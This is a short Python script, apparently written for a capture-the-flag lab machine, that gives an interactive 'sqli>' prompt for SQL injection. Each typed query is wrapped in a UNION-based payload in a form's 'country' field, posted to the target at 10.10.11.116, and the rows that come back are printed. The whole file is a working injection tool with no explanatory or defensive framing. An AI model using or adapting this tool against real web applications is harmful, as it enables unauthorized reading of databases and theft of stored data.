#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
from cmd import Cmd

class Term(Cmd):

    prompt = "sqli> "

    def default(self, args):
        url = "http://10.10.11.116/"
        username = "bigb0ss"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }

        data = {
            "username": username, 
            "country": f"' union {args};-- -",
        }
        
        r = requests.post(url, headers=headers, data=data)

        output = BeautifulSoup(r.text, 'html.parser')

        if output.li:
            print('\n'.join([x.text for x in output.findAll('li')]))

    def quit(self, args):
        return 1

term = Term()
term.cmdloop()